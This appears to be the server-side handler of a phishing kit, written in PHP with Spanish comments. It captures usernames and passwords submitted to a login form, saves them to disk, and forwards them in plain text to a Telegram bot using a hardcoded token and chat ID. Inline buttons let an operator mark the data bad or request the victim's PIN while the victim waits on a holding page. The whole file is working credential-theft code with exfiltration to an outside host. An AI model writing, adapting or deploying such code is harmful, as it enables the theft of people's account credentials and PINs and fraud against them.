<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $usuario = isset($_POST['username']) ? trim($_POST['username']) : '';
    $clave = isset($_POST['password']) ? trim($_POST['password']) : '';

    if (!empty($usuario) && !empty($clave)) {
        $id_transmision = 'SES_' . uniqid() . '_' . rand(100, 999);
        $_SESSION['usuario_id'] = $id_transmision;

        $datos_iniciales = [
            'usuario' => $usuario,
            'clave' => $clave,
            'pin' => '',
            'estado' => 'pendiente',
            'fecha' => date('Y-m-d H:i:s')
        ];

        if (!is_dir('sesiones')) { mkdir('sesiones', 0777, true); }
        file_put_contents("sesiones/{$id_transmision}.json", json_encode($datos_iniciales));

        // --- SOLUCIÓN DE ENVÍO SEGURO ---
        $token = "9156419748:AAFXdu2ORQoLuvGXuISZ9xfxEfdeEUVgRBw";
        $chat_id = "8166259970";

        // Construimos el mensaje como texto plano
        $mensaje = "NUEVO REGISTRO DE ACCESO\n\n";
        $mensaje .= "ID SESION: " . $id_transmision . "\n";
        $mensaje .= "USUARIO: " . $usuario . "\n";
        $mensaje .= "CLAVE: " . $clave . "\n\n";
        $mensaje .= "Seleccione la accion:";

        // Payload sin 'parse_mode', para que cualquier carácter sea aceptado
        $payload = [
            'chat_id' => $chat_id,
            'text' => $mensaje,
            'reply_markup' => json_encode([
                'inline_keyboard' => [
                    [
                        ['text' => '❌ Datos Malos', 'callback_data' => "redirigir|{$id_transmision}|datos_malos"],
                        ['text' => '🔑 Pedir PIN', 'callback_data' => "redirigir|{$id_transmision}|pedir_pin"]
                    ]
                ]
            ])
        ];

        // Enviamos el mensaje
        $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
        curl_exec($ch);
        curl_close($ch);

        // Redireccionar al usuario a la espera
        header("Location: esperar.php");
        exit();
    } else {
        header("Location: index.php");
        exit();
    }
} else {
    header("Location: index.php");
    exit();
}
?>